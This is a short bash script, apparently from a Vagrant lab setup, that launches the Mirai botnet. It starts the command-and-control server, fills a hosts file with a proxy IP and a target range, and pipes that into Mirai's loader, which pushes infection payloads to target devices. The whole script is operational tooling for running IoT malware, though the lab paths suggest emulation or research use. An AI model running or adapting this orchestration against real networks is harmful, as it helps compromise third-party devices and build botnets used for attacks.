#!/usr/bin/env bash
if [ $# != 1 ]; then
    echo "!> Missing build type." 
    echo "!> Usage: $0 <debug | release>"
    exit
fi

if [ "$1" == "release" ]; then

  LOADER=./loader

elif [ "$1" == "debug" ]; then

  LOADER=./loader.dbg

else
    echo "Unknown parameter $1: $0"
fi


echo ">>> Starting cnc..."
killall cnc || true
duende /vagrant/mirai/release/cnc

echo "source /root/.profile"
      source /root/.profile

echo ">>> Startig loader..."
cd /vagrant/mirai/loader
cp /vagrant/configs/hosts.txt /vagrant/mirai/loader/bins/
sed -i "s|{ip_prx}|$ip_prx|g;" /vagrant/mirai/loader/bins/hosts.txt
sed -i "s|{tgt_bgn}|$tgt_bgn|g;" /vagrant/mirai/loader/bins/hosts.txt
echo "content in /vagrant/mirai/loader/bins/hosts.txt:"
cat /vagrant/mirai/loader/bins/hosts.txt
echo ""
./reports /vagrant/mirai/loader/bins/hosts.txt | $LOADER
